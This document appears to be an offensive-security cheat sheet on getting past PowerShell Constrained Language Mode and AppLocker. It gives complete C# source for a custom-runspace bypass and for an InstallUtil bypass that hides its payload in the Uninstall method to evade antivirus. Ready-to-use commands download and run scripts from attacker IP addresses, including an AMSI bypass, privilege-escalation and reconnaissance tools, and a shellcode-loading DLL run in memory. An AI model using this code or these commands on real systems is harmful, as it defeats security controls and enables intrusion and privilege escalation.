#### Background

    //Constrained language mode - FullLanguage (default), RestrictedLanguage, or NoLanguage
        //can bypass w/ v2 downgrade (powershell -ep bypass -version 2)
        //means only scripts from approved locations can run (also no command-line)
        //Test:  [Math]::Cos(1)
        *Check current mode:  $ExecutionContext.SessionState.LanguageMode

### Basic Custom Runspace Bypass

    //Custom Runspaces Bypass - **Works even if Powershell is Contrained - OR if PowerShell.exe is blocked!
            vscode > new C# Console App > PSAppLockerBypass
        *Run PS commands by recompiling PSAppLockerBypass.exe  
            ex. for privesc:  String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.188/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt";

    ###########The Code:###########
    using System;
    using System.Management.Automation;
    using System.Management.Automation.Runspaces;
    namespace Bypass
    {
        class Program
        {
            static void Main(string[] args)
            {
                Runspace rs = RunspaceFactory.CreateRunspace();
                rs.Open();
                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;
                //to run commands:
                String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.188/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt";
                ps.AddScript(cmd);
                ps.Invoke();
                rs.Close();
            }
        }
    } 


### **Custom InstallUtil Bypass**

    //fake main method can be used to evade AV, but Uninstall method has the code
    ////might have to remote MOTW first:  echo "" > C:\Tools\InstallUtilBypass.exe:Zone.Identifier (if downloaded from browser - error 0x80131515)
    //*Manually add System.Management.Automation.Runspaces to References from C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35

    //run custom commands via cmdline!
        //can't directly launch a blocked exe; must launch in memory, etc.!
        
    //Basic Usage:  
        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /cmd=whoami /U c:\windows\tasks\S.exe
    //Another Example:
        upload InstallUtilBypass.exe c:/windows/tasks/S.exe
        set IP=192.168.49.121
        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /cmd="(New-Object System.Net.WebClient).DownloadString('http://%IP%/amsi.txt') | IEX; (New-Object System.Net.WebClient).DownloadString('http://%IP%/HostRecon.ps1') | IEX; Invoke-HostRecon > Hrecon.txt; (new-object system.net.webclient).downloadstring('http://%IP%/Invoke-Seatbelt.ps1') | IEX; Invoke-Seatbelt -Command '-group=all -outputfile=seat.txt'; (New-Object System.Net.WebClient).DownloadString('http://%IP%/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath Pup.txt; IEX(New-Object Net.WebClient).downloadString('http://%IP%/winpeas.ps1') > winp.txt" /U c:\windows\tasks\S.exe
    //Hollow.dll Shellcode Runner:
        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /cmd="echo '#######AMSIBYPASS#######'; (New-Object System.Net.WebClient).DownloadString('http://%IP%/amsi.txt') | IEX; $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.121/HollowDLL.dll'); $assem = [System.Reflection.Assembly]::Load($data); $class = $assem.GetType(\"HollowDLL.Program\"); $method = $class.GetMethod(\"Hollow\"); $method.Invoke(0, $null); echo '#######DONE#######'" /U c:\windows\tasks\S.exe

    #######The Code:#######
    using System;
    using System.Management.Automation;
    using System.Management.Automation.Runspaces;
    using System.Configuration.Install;
    using System.Diagnostics;
    using System.Net;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Collections.ObjectModel;

    namespace ConsoleApp17
    {
        class Program
        {
            static void Main(string[] args)
            {
                Console.WriteLine("Error");
            }
        }
        [System.ComponentModel.RunInstaller(true)]
        public class Sample : System.Configuration.Install.Installer
        {
            public override void Uninstall(System.Collections.IDictionary savedState)
            {
                pwsh.Exec(Context.Parameters["cmd"]);
            }
        }

        public class pwsh
        {
            public static void Exec(string command)
            {
                Console.WriteLine("[+] Usage: C:\\Windows\\Microsoft.NET\\Framework64\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /cmd=whoami /U C:\\Tools\\Bypass.exe\n\n");
                Runspace rs = RunspaceFactory.CreateRunspace();
                rs.Open();
                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;
                String cmd = command;
                ps.AddScript(cmd);
                Console.WriteLine("[+] Executing: " + cmd + "\n");
                Collection<PSObject> results = ps.Invoke();
                StringBuilder stringBuilder = new StringBuilder();
                foreach (PSObject obj in results)
                {
                    stringBuilder.AppendLine(obj.ToString());
                }
                Console.WriteLine(stringBuilder.ToString());
                rs.Close();
            }
        }
    }
